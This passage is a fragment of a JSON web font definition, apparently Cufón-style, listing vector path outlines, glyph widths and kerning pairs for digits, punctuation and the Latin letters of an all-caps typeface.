8,136v-70,10,-82,-104,-37,-136v-45,-25,-30,-133,37,-122v66,-10,82,94,38,122xm49,-85v0,25,1,56,22,52v21,4,23,-26,23,-52v0,-20,-9,-28,-23,-28v-14,0,-22,8,-22,28xm71,-219v-18,0,-22,19,-22,43v0,20,9,27,22,27v18,0,23,-17,23,-41v0,-23,-10,-29,-23,-29"},"9":{"d":"71,-255v86,0,60,114,60,192v0,42,-20,66,-61,66v-41,0,-61,-26,-59,-70r38,0v-1,20,4,36,20,34v29,4,21,-48,22,-77v-21,40,-89,24,-81,-35v-4,-60,3,-110,61,-110xm71,-124v28,0,20,-43,20,-70v0,-18,-7,-25,-20,-25v-29,0,-20,43,-21,70v0,18,8,25,21,25"},":":{"d":"14,-38r39,0r0,38r-39,0r0,-38xm14,-175r39,0r0,38r-39,0r0,-38","w":66,"k":{"\u1ef3":7,"\u1ef2":7,"\u1e6b":13,"\u1e6a":13,"\u021b":13,"\u021a":13,"\u0178":7,"\u0177":7,"\u0176":7,"\u0167":13,"\u0166":13,"\u0165":13,"\u0164":13,"\u0163":13,"\u0162":13,"\u00ff":7,"\u00fd":7,"\u00dd":7,"y":7,"t":13,"Y":7,"T":13}},";":{"d":"30,0r-16,0r0,-38r39,0v4,34,-8,53,-18,74r-16,0xm14,-175r39,0r0,38r-39,0r0,-38","w":66,"k":{"\u1ef3":7,"\u1ef2":7,"\u1e6b":13,"\u1e6a":13,"\u021b":13,"\u021a":13,"\u0178":7,"\u0177":7,"\u0176":7,"\u0167":13,"\u0166":13,"\u0165":13,"\u0164":13,"\u0163":13,"\u0162":13,"\u00ff":7,"\u00fd":7,"\u00dd":7,"y":7,"t":13,"Y":7,"T":13}},"<":{"d":"128,-69r-117,-43r0,-28r117,-43r0,28r-80,29r80,29r0,28"},"=":{"d":"13,-111r117,0r0,28r-117,0r0,-28xm13,-169r117,0r0,28r-117,0r0,-28"},">":{"d":"132,-112r-118,43r0,-28r81,-29r-81,-29r0,-28r118,43r0,28"},"?":{"d":"78,-56r-35,0v-12,-63,41,-72,41,-138v0,-18,-7,-25,-20,-25v-23,0,-19,29,-19,52r-38,0v-4,-52,10,-89,59,-88v39,0,58,23,58,63v0,72,-55,76,-46,136xm41,-38r39,0r0,38r-39,0r0,-38","w":129},"@":{"d":"171,-46v-18,0,-30,-6,-31,-23v-22,39,-76,23,-68,-34v6,-41,10,-90,48,-90v15,0,25,8,30,22r2,-21r34,0r-10,105v-1,6,1,9,7,9v20,0,29,-45,29,-82v0,-45,-22,-76,-72,-76v-64,0,-98,51,-98,133v0,93,95,120,159,70r-3,34v-24,16,-47,21,-74,21v-81,0,-115,-51,-115,-126v0,-89,43,-162,132,-162v76,0,101,47,101,105v0,89,-43,115,-71,115xm131,-158v-22,0,-21,33,-24,53v-2,17,5,24,16,24v23,0,22,-36,24,-57v2,-14,-6,-20,-16,-20","w":248},"A":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"B":{"d":"14,-252v65,-2,119,-6,119,67v0,26,-8,43,-26,51v49,19,43,146,-30,134r-63,0r0,-252xm97,-61v0,-39,-5,-59,-43,-52r0,77v24,0,43,5,43,-25xm93,-176v0,-33,-8,-45,-39,-40r0,67v24,1,39,0,39,-27","w":146,"k":{"\u2026":2,"\u201e":2,"\u201d":4,"\u201c":4,"\u201a":2,"\u2019":4,"\u2018":4,"x":1,"v":1,"X":1,"V":1,".":2,",":2,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5}},"C":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"D":{"d":"14,0r0,-252v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,180v23,0,42,4,42,-24r0,-132","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"E":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0","w":132},"F":{"d":"54,-216r0,76r51,0r0,36r-51,0r0,104r-40,0r0,-252r105,0r0,36r-65,0","w":123,"k":{"\u2026":25,"\u201e":25,"\u201a":25,"}":-2,"]":-2,".":25,",":25,")":-2,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":14,"\u01fc":14,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":14,"\u01fd":14,"J":7,"\u0132":7,"\u0134":7,"Z":4,"\u0179":4,"\u017b":4,"\u017d":4,"j":7,"\u0133":7,"\u0135":7,"\u0237":7,"z":4,"\u017a":4,"\u017c":4,"\u017e":4}},"G":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"H":{"d":"54,-108r0,108r-40,0r0,-252r40,0r0,108r45,0r0,-108r40,0r0,252r-40,0r0,-108r-45,0","w":153},"I":{"d":"14,0r0,-252r40,0r0,252r-40,0","w":68},"J":{"d":"4,0r0,-36v21,1,36,1,36,-24r0,-192r40,0r0,189v-2,58,-32,68,-76,63","w":92,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"K":{"d":"105,0r-39,-100v-18,20,-11,64,-12,100r-40,0r0,-252r40,0r0,110r53,-110r38,0r-55,112r55,140r-40,0","w":149,"k":{"\u0153":3,"\u0152":3,"q":3,"Q":3,"C":3,"\u00c7":3,"\u0106":3,"\u0108":3,"\u010a":3,"\u010c":3,"G":3,"\u011c":3,"\u011e":3,"\u0120":3,"\u0122":3,"O":3,"\u00d2":3,"\u00d3":3,"\u00d4":3,"\u00d5":3,"\u00d6":3,"\u00d8":3,"\u014c":3,"\u014e":3,"\u0150":3,"\u01fe":3,"c":3,"\u00e7":3,"\u0107":3,"\u0109":3,"\u010b":3,"\u010d":3,"g":3,"\u011d":3,"\u011f":3,"\u0121":3,"\u0123":3,"o":3,"\u00f2":3,"\u00f3":3,"\u00f4":3,"\u00f5":3,"\u00f6":3,"\u00f8":3,"\u014d":3,"\u014f":3,"\u0151":3,"\u01ff":3,"S":2,"\u015a":2,"\u015c":2,"\u015e":2,"\u0160":2,"\u0218":2,"\u1e60":2,"U":1,"\u00d9":1,"\u00da":1,"\u00db":1,"\u00dc":1,"\u0168":1,"\u016a":1,"\u016c":1,"\u016e":1,"\u0170":1,"\u0172":1,"s":2,"\u00df":2,"\u015b":2,"\u015d":2,"\u015f":2,"\u0161":2,"\u0219":2,"\u1e61":2,"u":1,"\u00f9":1,"\u00fa":1,"\u00fb":1,"\u00fc":1,"\u0169":1,"\u016b":1,"\u016d":1,"\u016f":1,"\u0171":1,"\u0173":1}},"L":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0","w":122,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"M":{"d":"69,-252r29,179r27,-179r55,0r0,252r-37,0r0,-181r-27,181r-38,0r-29,-178r0,178r-35,0r0,-252r55,0","w":194},"N":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0","w":153},"O":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"P":{"d":"14,-252v63,-3,118,-3,118,62v0,63,-11,103,-78,95r0,95r-40,0r0,-252xm92,-192v1,-27,-15,-24,-38,-24r0,85v22,0,38,4,38,-23r0,-38","w":135,"k":{"\u2026":29,"\u201e":29,"\u201a":29,"x":4,"X":4,".":29,",":29,"Y":1,"\u00dd":1,"\u0176":1,"\u0178":1,"\u1ef2":1,"y":1,"\u00fd":1,"\u00ff":1,"\u0177":1,"\u1ef3":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":11,"\u01fc":11,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":11,"\u01fd":11,"J":6,"\u0132":6,"\u0134":6,"j":6,"\u0133":6,"\u0135":6,"\u0237":6}},"Q":{"d":"99,-2v-112,34,-86,-102,-88,-190v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,14,-2,26,-7,35v2,6,8,5,15,5r0,35v-20,1,-35,-5,-40,-17xm51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25","k":{"\u1ef3":5,"\u1ef2":5,"\u0178":5,"\u0177":5,"\u0176":5,"\u00ff":5,"\u00fd":5,"\u00dd":5,"y":5,"Y":5,"\u201d":4,"\u201c":4,"\u2019":4,"\u2018":4}},"R":{"d":"138,0r-41,0v-13,-28,21,-119,-43,-103r0,103r-40,0r0,-252v70,-3,119,-4,119,78v0,26,-8,43,-26,51v41,13,17,82,31,123xm93,-165v0,-36,-3,-59,-39,-51r0,77v23,1,39,1,39,-26","w":144,"k":{"v":1,"V":1,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"S":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"T":{"d":"4,-216r0,-36r122,0r0,36r-41,0r0,216r-40,0r0,-216r-41,0","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"U":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"V":{"d":"44,-252r30,206r30,-206r37,0r-39,252r-59,0r-39,-252r40,0","w":144,"k":{"\u0237":9,"\u01fd":17,"\u01fc":17,"\u0135":9,"\u0134":9,"\u0133":9,"\u0132":9,"\u0105":9,"\u0104":9,"\u0103":9,"\u0102":9,"\u0101":9,"\u0100":9,"\u00e6":17,"\u00e5":9,"\u00e4":9,"\u00e3":9,"\u00e2":9,"\u00e1":9,"\u00e0":9,"\u00c6":17,"\u00c5":9,"\u00c4":9,"\u00c3":9,"\u00c2":9,"\u00c1":9,"\u00c0":9,"\u00ad":4,"j":9,"a":9,"J":9,"A":9,"-":4,"\u2026":22,"\u201e":22,"\u201a":22,"}":-1,"]":-1,".":22,",":22,")":-1}},"W":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"X":{"d":"110,-252r37,0r-42,122r44,130r-41,0r-33,-100r-33,100r-37,0r45,-130r-42,-122r41,0r30,93","w":154,"k":{"\u1e61":3,"\u1e60":3,"\u0219":3,"\u0218":3,"\u01ff":5,"\u01fe":5,"\u0161":3,"\u0160":3,"\u015f":3,"\u015e":3,"\u015d":3,"\u015c":3,"\u015b":3,"\u015a":3,"\u0151":5,"\u0150":5,"\u014f":5,"\u014e":5,"\u014d":5,"\u014c":5,"\u0123":5,"\u0122":5,"\u0121":5,"\u0120":5,"\u011f":5,"\u011e":5,"\u011d":5,"\u011c":5,"\u010d":5,"\u010c":5,"\u010b":5,"\u010a":5,"\u0109":5,"\u0108":5,"\u0107":5,"\u0106":5,"\u00f8":5,"\u00f6":5,"\u00f5":5,"\u00f4":5,"\u00f3":5,"\u00f2":5,"\u00e7":5,"\u00df":3,"\u00d8":5,"\u00d6":5,"\u00d5":5,"\u00d4":5,"\u00d3":5,"\u00d2":5,"\u00c7":5,"\u00ad":5,"s":3,"o":5,"g":5,"c":5,"S":3,"O":5,"G":5,"C":5,"-":5,"\u201d":1,"\u201c":1,"\u2019":1,"\u2018":1,"\u0153":5,"\u0152":5,"q":5,"Q":5}},"Y":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"Z":{"d":"12,-252r112,0r0,35r-75,181r75,0r0,36r-116,0r0,-35r76,-181r-72,0r0,-36","w":133,"k":{"-":5,"\u00ad":5}},"[":{"d":"17,0r0,-252r65,0r0,32r-25,0r0,188r25,0r0,32r-65,0","w":90,"k":{"\u1ef3":-2,"\u1ef2":-2,"\u1e85":-1,"\u1e84":-1,"\u1e83":-1,"\u1e82":-1,"\u1e81":-1,"\u1e80":-1,"\u1e6b":-3,"\u1e6a":-3,"\u021b":-3,"\u021a":-3,"\u0178":-2,"\u0177":-2,"\u0176":-2,"\u0175":-1,"\u0174":-1,"\u0167":-3,"\u0166":-3,"\u0165":-3,"\u0164":-3,"\u0163":-3,"\u0162":-3,"\u00ff":-2,"\u00fd":-2,"\u00dd":-2,"y":-2,"w":-1,"t":-3,"Y":-2,"W":-1,"T":-3,"v":-1,"V":-1}},"\\":{"d":"36,-252r99,252r-34,0r-99,-252r34,0","w":137},"]":{"d":"73,-252r0,252r-65,0r0,-32r26,0r0,-188r-26,0r0,-32r65,0","w":90},"^":{"d":"7,-140r50,-112r28,0r50,112r-31,0r-33,-76r-32,76r-32,0"},"_":{"d":"0,32r0,-28r180,0r0,28r-180,0","w":180},"`":{"d":"10,-306r43,0r26,42r-30,0","w":90},"a":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"b":{"d":"14,-252v65,-2,119,-6,119,67v0,26,-8,43,-26,51v49,19,43,146,-30,134r-63,0r0,-252xm97,-61v0,-39,-5,-59,-43,-52r0,77v24,0,43,5,43,-25xm93,-176v0,-33,-8,-45,-39,-40r0,67v24,1,39,0,39,-27","w":146,"k":{"\u2026":2,"\u201e":2,"\u201d":4,"\u201c":4,"\u201a":2,"\u2019":4,"\u2018":4,"x":1,"v":1,"X":1,"V":1,".":2,",":2,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5}},"c":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"d":{"d":"14,0r0,-252v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,180v23,0,42,4,42,-24r0,-132","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"e":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0","w":132},"f":{"d":"54,-216r0,76r51,0r0,36r-51,0r0,104r-40,0r0,-252r105,0r0,36r-65,0","w":123,"k":{"\u2026":25,"\u201e":25,"\u201a":25,"}":-2,"]":-2,".":25,",":25,")":-2,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":14,"\u01fc":14,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":14,"\u01fd":14,"J":7,"\u0132":7,"\u0134":7,"Z":4,"\u0179":4,"\u017b":4,"\u017d":4,"j":7,"\u0133":7,"\u0135":7,"\u0237":7,"z":4,"\u017a":4,"\u017c":4,"\u017e":4}},"g":{"d":"74,-104r0,-36r55,0v0,67,12,143,-59,143v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v29,0,20,-44,21,-71r-18,0","w":140,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"h":{"d":"54,-108r0,108r-40,0r0,-252r40,0r0,108r45,0r0,-108r40,0r0,252r-40,0r0,-108r-45,0","w":153},"i":{"d":"14,0r0,-252r40,0r0,252r-40,0","w":68},"j":{"d":"4,0r0,-36v21,1,36,1,36,-24r0,-192r40,0r0,189v-2,58,-32,68,-76,63","w":92,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"k":{"d":"105,0r-39,-100v-18,20,-11,64,-12,100r-40,0r0,-252r40,0r0,110r53,-110r38,0r-55,112r55,140r-40,0","w":149,"k":{"\u0153":3,"\u0152":3,"q":3,"Q":3,"C":3,"\u00c7":3,"\u0106":3,"\u0108":3,"\u010a":3,"\u010c":3,"G":3,"\u011c":3,"\u011e":3,"\u0120":3,"\u0122":3,"O":3,"\u00d2":3,"\u00d3":3,"\u00d4":3,"\u00d5":3,"\u00d6":3,"\u00d8":3,"\u014c":3,"\u014e":3,"\u0150":3,"\u01fe":3,"c":3,"\u00e7":3,"\u0107":3,"\u0109":3,"\u010b":3,"\u010d":3,"g":3,"\u011d":3,"\u011f":3,"\u0121":3,"\u0123":3,"o":3,"\u00f2":3,"\u00f3":3,"\u00f4":3,"\u00f5":3,"\u00f6":3,"\u00f8":3,"\u014d":3,"\u014f":3,"\u0151":3,"\u01ff":3,"S":2,"\u015a":2,"\u015c":2,"\u015e":2,"\u0160":2,"\u0218":2,"\u1e60":2,"U":1,"\u00d9":1,"\u00da":1,"\u00db":1,"\u00dc":1,"\u0168":1,"\u016a":1,"\u016c":1,"\u016e":1,"\u0170":1,"\u0172":1,"s":2,"\u00df":2,"\u015b":2,"\u015d":2,"\u015f":2,"\u0161":2,"\u0219":2,"\u1e61":2,"u":1,"\u00f9":1,"\u00fa":1,"\u00fb":1,"\u00fc":1,"\u0169":1,"\u016b":1,"\u016d":1,"\u016f":1,"\u0171":1,"\u0173":1}},"l":{"d":"14,0r0,-252r40,0r0,216r65,0r0,36r-105,0","w":122,"k":{"\u201d":27,"\u201c":27,"\u2019":27,"\u2018":27,"}":-3,"v":12,"]":-3,"V":12,"?":11,")":-3,"T":18,"\u0162":18,"\u0164":18,"\u0166":18,"\u021a":18,"\u1e6a":18,"W":6,"\u0174":6,"\u1e80":6,"\u1e82":6,"\u1e84":6,"Y":22,"\u00dd":22,"\u0176":22,"\u0178":22,"\u1ef2":22,"-":14,"\u00ad":14,"t":18,"\u0163":18,"\u0165":18,"\u0167":18,"\u021b":18,"\u1e6b":18,"w":6,"\u0175":6,"\u1e81":6,"\u1e83":6,"\u1e85":6,"y":22,"\u00fd":22,"\u00ff":22,"\u0177":22,"\u1ef3":22,"J":-2,"\u0132":-2,"\u0134":-2,"j":-2,"\u0133":-2,"\u0135":-2,"\u0237":-2}},"m":{"d":"69,-252r29,179r27,-179r55,0r0,252r-37,0r0,-181r-27,181r-38,0r-29,-178r0,178r-35,0r0,-252r55,0","w":194},"n":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0","w":153},"o":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"p":{"d":"14,-252v63,-3,118,-3,118,62v0,63,-11,103,-78,95r0,95r-40,0r0,-252xm92,-192v1,-27,-15,-24,-38,-24r0,85v22,0,38,4,38,-23r0,-38","w":135,"k":{"\u2026":29,"\u201e":29,"\u201a":29,"x":4,"X":4,".":29,",":29,"Y":1,"\u00dd":1,"\u0176":1,"\u0178":1,"\u1ef2":1,"y":1,"\u00fd":1,"\u00ff":1,"\u0177":1,"\u1ef3":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":11,"\u01fc":11,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":11,"\u01fd":11,"J":6,"\u0132":6,"\u0134":6,"j":6,"\u0133":6,"\u0135":6,"\u0237":6}},"q":{"d":"99,-2v-112,34,-86,-102,-88,-190v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,14,-2,26,-7,35v2,6,8,5,15,5r0,35v-20,1,-35,-5,-40,-17xm51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25","k":{"\u1ef3":5,"\u1ef2":5,"\u0178":5,"\u0177":5,"\u0176":5,"\u00ff":5,"\u00fd":5,"\u00dd":5,"y":5,"Y":5,"\u201d":4,"\u201c":4,"\u2019":4,"\u2018":4}},"r":{"d":"138,0r-41,0v-13,-28,21,-119,-43,-103r0,103r-40,0r0,-252v70,-3,119,-4,119,78v0,26,-8,43,-26,51v41